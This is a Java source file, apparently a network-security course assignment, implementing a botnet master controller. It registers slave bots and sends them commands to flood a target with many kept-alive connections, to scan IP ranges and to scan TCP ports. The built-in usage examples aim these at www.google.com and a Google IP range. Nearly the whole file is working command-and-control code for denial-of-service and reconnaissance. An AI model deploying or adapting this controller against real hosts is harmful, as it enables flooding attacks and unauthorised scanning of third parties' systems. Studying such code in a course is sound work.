import java.io.*;
import java.util.*;
import java.net.*;
import java.time.*;
import java.util.concurrent.CopyOnWriteArrayList;
/* 
 	CMPE 206
 	3/6/2017
 	Timothy Fong
*/

// MasterBot opens a ServerSocket on port X

public class MasterBot {
	
	private ServerThread serverThread;
    private final int SERVER_PORT;
    private final static String CMD_LIST = "list";
    public final static String CMD_CONNECT = "connect";
    public final static String CMD_DISCONNECT = "disconnect";
    public final static String CMD_STOP = "stop";
    public final static String CMD_IPSCAN = "ipscan";
    public final static String CMD_TCPPORTSCAN = "tcpportscan";
    private List<String> slaveList = new CopyOnWriteArrayList<>();
    
    
    // constructor to create a Masterbot at port p
    public MasterBot(int p) {
         SERVER_PORT = p;
    }
 	
 	// method create a server to start reading from slave bots
    public void start() throws IOException {
    	// create the server to connect with slaves
        serverThread = startServerThread();
        // loop until user inputs
        waitForUserInput();
        print("Masterbot setup complete");
    }
	
	// Start server thread method
    // will wait for slave connection.
    private ServerThread startServerThread() {
    	// initialize a new serverthread
        ServerThread serverThread = new ServerThread();
        // java serverthread library start command
        serverThread.start();
        return serverThread;
    }
	
    // read user inputs
    private void waitForUserInput() throws IOException {
		// Read input from command line
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
        // loop to read multiple commands
        while (true) {
            printPrompt();
            String line = bufferedReader.readLine();
            // list call list method
            if (CMD_LIST.equals(line)) {
                list();
            } 
            // connect call connect method
            else if (line.startsWith(CMD_CONNECT)) {
                connect(line);
            } 
            // disconnect call connect method
            else if (line.startsWith(CMD_DISCONNECT)) {
                disconnect(line);
            } 
            // stop everything
            else if (CMD_STOP.equals(line)) {
                stop();
                break;
            } 
            // ipscan method
            else if (line.startsWith(CMD_IPSCAN)) {
            	ipscan(line);
            }
            // tcpportscan method
            else if (line.startsWith(CMD_TCPPORTSCAN)) {
            	tcpportscan(line);
            }
            // remind user of different commands
            else {
                printCommands();
            }
        }
	}
    
	// List all registered slaves
	private void list() {
    	// read from the list    	
    	for (int i = 0; i < slaveList.size(); i++) {
    		String slave = slaveList.get(i);
    		String[] arr = slave.split(":");
            String host = arr[0];
            String ip = arr[1];
            String port = arr[2];
            LocalDate localDate = LocalDate.ofEpochDay(Long.parseLong(arr[3]));
            String s = String.format("%s %s %s %s", host, ip, port, localDate.toString());
            print(s);
    	}
		System.out.println("Number of Slaves: " + getNumOfSlaves());
    }

	// Connect command to slaves
    private void connect(String line) {
    	// read in slave connection details into an array
    	// split string into an array
        String[] arr = line.split(" ");
        // check if the inputs include all:
        // IPAddressOrHostNameOfYourSlave or all 
        // TargetHostName
        // TargetPortNumber
        // else stop connect method
        if (arr.length < 4) {
            return;
        }
        // connect
        String command = arr[0];
        // IPAddressOrHostNameOfYourSlave
        String IPAddressOrHostNameOfYourSlave = arr[1];
        // TargetHostName
        String ip = arr[2];
        // TargetPortNumber
        String port = arr[3];
        // for multiple connections
		String numberOfConnections;
		if(arr.length >= 5) {
			numberOfConnections = arr[4];
		}
		else {
			numberOfConnections = "1";
		}
        //String numberOfConnections = arr.length >= 5 ? arr[4] : "1";        
        try {
            Integer.parseInt(numberOfConnections);
        } 
		catch (NumberFormatException e) {
            print(e.getMessage());
            numberOfConnections = "1";
        }
		// check for keepalive
		String keepAlive;
		if(line.contains("keepalive")) {
			keepAlive = "keepalive=true";
		}
		else {
			keepAlive = "keepalive=false";
		}
		// String keepAlive = line.contains("keepalive") ? "keepalive=true" : "keepalive=false";
		// check for url
		String strUrl = "url=";
        for (int i = 4; i < arr.length; i++) {
            if (arr[i].contains(strUrl)) {
                strUrl = arr[i];
            }
        }
		String message = command
                + " " + ip
                + " " + port
                + " " + numberOfConnections
                + " " + keepAlive
                + " " + strUrl;
		
        // if the IPAddressOrHostNameOfYourSlave is the 
        // same for all slave bots
        if (IPAddressOrHostNameOfYourSlave.equals("all")) {
            sendToAllSlaves(message);
        } 
        else {
            sendToSlave(IPAddressOrHostNameOfYourSlave, message);
        }
    }

	// Disconnect command to slaves
    private void disconnect(String line) {
    	// same as connect
        String[] arr = line.split(" ");
        if (arr.length < 3) {
            return;
        }
        String IPAddressOrHostNameOfYourSlave = arr[1];
		String targetPort;
		if(arr.length == 4) {
			targetPort = arr[3];
		}
		else {
			targetPort = "all";
		}
		try {
            Integer.parseInt(targetPort);
        } 
		catch (NumberFormatException e) {
            print(e.getMessage());
            targetPort = "all";
        }
        //String message = arr[0] + " " + arr[2] + " " + (arr.length > 3 ? arr[3] : "all");
		String message = arr[0] + " " + arr[2] + " " + targetPort;
        if (IPAddressOrHostNameOfYourSlave.equals("all")) {
            sendToAllSlaves(message);
        } else {
            sendToSlave(IPAddressOrHostNameOfYourSlave, message);
        }
    }

    // Stop command
    // call the ServerThread class stop
    private void stop() {
        serverThread.stopServer();
    }

    // Ipscan command
    private void ipscan(String line) {
    	String[] arr = line.split(" ");
        if (arr.length < 3) {
            print("error0");
        	return;
        }
        // ipscan
        String command = arr[0];
        // IPAddressOrHostNameOfYourSlave
        String IPAddressOrHostNameOfYourSlave = arr[1];
        // IPAddressRange
        String ip = arr[2];
        String[] range = ip.split("-");
//        for(String ips : range) {
//        	print(ips);
//        }
        if (range.length < 2) {
        	print("error1");
        	return;
        }
//        // Master-to-Slave
//        PrintWriter send;
//        // Receive from Slave
//        BufferedReader receive;
//        String [] IPsfromSlave;
        
        
        String ip1 = range[0];
        String ip2 = range [1];
        String [] start = ip1.split("\\.");
        String [] end = ip2.split("\\.");
        if(start.length < 4) {
            print("error2");
            //print(start[0]);
            //print(start);
        	return;
        }
        if(end.length < 4) {
            print("error3");
        	return;
        }
        String message = command + " " + ip1 + " " + ip2;
        if (IPAddressOrHostNameOfYourSlave.equals("all")) {
            sendToAllSlaves(message);
        } 
        else {
            sendToSlave(IPAddressOrHostNameOfYourSlave, message);
        }
    }
    
    // TcpPortScan command
    private void tcpportscan(String line) {
    	String[] arr = line.split(" ");
        if (arr.length < 4 ) {
            print("error0");
        	return;
        }
        // tcpportscan
        String command = arr[0];
        // IPAddressOrHostNameOfYourSlave
        String IPAddressOrHostNameOfYourSlave = arr[1];
        // IPAddressRange
        String ip = arr[2];
        String[] range = arr[3].split("-");
        String port1 = range[0];
        String port2 = range[1];
        String message = command
                + " " + ip
                + " " + port1
                + " " + port2;
        if (IPAddressOrHostNameOfYourSlave.equals("all")) {
            sendToAllSlaves(message);
        } 
        else {
            sendToSlave(IPAddressOrHostNameOfYourSlave, message);
        }
    }
    
    // reminder to user of commands
    private void printCommands() {
        print("List of Commands: \n" +
                "list\n" +
                "connect IPAddressOrHostNameOfYourSlave|all " +
						"TargetHostName|IPAddress " +
						"TargetPortNumber " +
						"NumberOfConnections " +
						"keepalive(optional) " +
						"url=/#q=(optional)\n" +
                "Example: connect all www.google.com 80 10 keepalive url=/#q=abcdef\n" +
                "disconnect IPAddressOrHostNameOfYourSlave|all TargetHostName|IPAddress TargetPort\n" +
                "Example: disconnect all www.google.com 80" +
                "ipscan (IPAddressOrHostNameOfYourSlave|all) (IPAddressRange)\n" +
                "Example: ipscan all 172.217.4.164-172.217.4.200\n" +
                "tcpportscan (IPAddressOrHostNameOfYourSlave|all) (TargetHostName|IPAddress) TargetPortNumberRange\n" +
                "tcpportscan all www.google.com 1-100\n");
    }
	
	// register slaves when connecting the threads
    private void register(String slave) {
    	System.out.println("registered a slave");
        String[] arr = slave.split(":");
        String host = arr[0];
        String ip = arr[1];
        String port = arr[2];
        long registrationDate = LocalDate.now().toEpochDay();
        String slaveItem = String.format("%s:%s:%s:%s", host, ip, port, registrationDate);
        slaveList.add(slaveItem);
        printPrompt();
    }
    
    // count number of slaves
    private int getNumOfSlaves() {
        return this.slaveList.size();
    }

	// method to send to all slaves
    private void sendToAllSlaves(String message) {
        slaveList.forEach((slave) -> {
                    String[] arr = slave.split(":");
                    String ip = arr[1];
                    String port = arr[2];
                    send(ip, port, message);
                }
        );
    }

	// method to send to a single slave
    private void sendToSlave(String IPAddressOrHostNameOfYourSlave, String message) {
        slaveList
                .stream()
                .filter((slave) -> slave.contains(IPAddressOrHostNameOfYourSlave))
                .forEach((slave) -> {
                            String[] arr = slave.split(":");
                            String ip = arr[1];
                            String port = arr[2];
                            send(ip, port, message);

                });
    }

    private void send(String ip, String port, String message) {
        new CommandThread(ip, Integer.parseInt(port), message).start();
    }

	// Serverthread class
    class ServerThread extends Thread {
    	// have the server constantly listening for slave communication
        private volatile boolean listening = true;

        // public constructor
        public ServerThread() {
            super("ServerThread");
        }
        
        // method to start server listening 
        @Override
        public void run() {
            try (ServerSocket serverSocket = new ServerSocket(SERVER_PORT)) {
                while (listening) {
                    new RegisterThread(serverSocket.accept()).start();
                }
            } 
            catch (IOException e) {
            	// print error message
                e.printStackTrace();
            }
        }
        // method to stop server listening
        public void stopServer() {
            // stop waiting for accept
            listening = false;
        }
    }
    
    // Thread to connect with the slaves
    class RegisterThread extends Thread {
        Socket socket;
        // constructor
        public RegisterThread(Socket s) {
            super("RegisterThread");
            this.socket = s;
        }

        // read the IP Port from the user input and connect
        @Override
        public void run() {
            try {
                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                    BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                // REGISTER IP:PORT
                String inputLine = in.readLine();
                if (inputLine.startsWith("REGISTER")) {
                    String[] arr = inputLine.split(" ");
                    register(arr[1]);
                    out.println("ACK REGISTER");
                    printPrompt();
                    socket.close();
                }
                // Receive scan results and print here
                else if (inputLine.startsWith("DONE")) {
                	int i = 0;
                	// first line is size of Ping or PortLine arraylist
                	inputLine = in.readLine();
                	int size = Integer.parseInt(inputLine);
                	// check if nothing is in list
                	if(size == 0) {
                		// print empty list ack
                		print("Empty list");
                		// print >
                		printPrompt();
                		// close socket
                        socket.close();
                	}
                	// if anything in list
                	else {
                		// go to first element in list
                		inputLine = in.readLine();
                		// loop through list and print
	                    while(!Objects.equals(inputLine, "END") && i < size) {
	                    	System.out.print(inputLine + ", ");
	                    	inputLine = in.readLine();
	                    	i++;
	                    }
	                    // print END and >
	                    print(inputLine);
	                    printPrompt();
	                    // close socket
	                    socket.close();
                	}
                }
            } 
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
        
    // Thread to command slaves to connect or disconnect
    class CommandThread extends Thread {
        private final String ip;
        private final int port;
        private final String command;

        // constructor
        public CommandThread(String ip, int port, String command) {
            this.ip = ip;
            this.port = port;
            this.command = command;
        }

        @Override
        public void run() {
            // CONNECT IP PORT
            // DISCONNECT
            try (Socket socket = new Socket(ip, port);
                 PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                 BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            ) 
            {
                socket.setSoTimeout(60000);
                // print("CommandThread " + command);
                out.println(command);

                String inputLine = in.readLine();
                if (inputLine.equals("ACK")) {
                    // print("CommandThread " + command + " DONE");
					print("DONE");
                } 
                else {
                    // print("CommandThread " + command + " FAILED");
					print("FAILED");
                }
                socket.close();
            } 
            catch (UnknownHostException e) {
                e.printStackTrace();
            } 
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
	
    public static void main(String[] args) {
    	// command -p PortNumber
    	
        // if cases for wrong input
		if (args.length < 2) {
	        instructions();
	        System.exit(-1);
	        return;
        }
		
    	// "-p"
    	String arg1 = args[0];
    	// "Portnumber"
        String arg2 = args[1]; 
		// check first read in port number 
        if (!"-p".equals(arg1)) {
        	instructions();
            System.exit(-1);
            return;
        }
		
        try {
        	// arg2 as an int
            int portNumber = Integer.parseInt(arg2);
            // setup new Masterbot
            MasterBot masterBot = new MasterBot(portNumber);
            // and start reading in Masterbot commands
            masterBot.start();
        } 
        // if there is an error setting up the Masterbot
        // abort and print instruction message
        catch (Exception e) {
            e.printStackTrace();
            instructions();
            System.exit(-1);
            return;
        }
    }

    // This will be a reminder/instruction how to 
	// set the port where master will listen 
	// for incoming connections from Slaves.
	private static void instructions() {
		System.out.println("Usage: -p PortNumber");
	}
	
	// A prompt for user to start ending Masterbot commands
	private static void printPrompt() {
        System.out.print("> ");
    }
	// print list and anything else
	private static void print(String s) {
        System.out.println(s);
    }
}
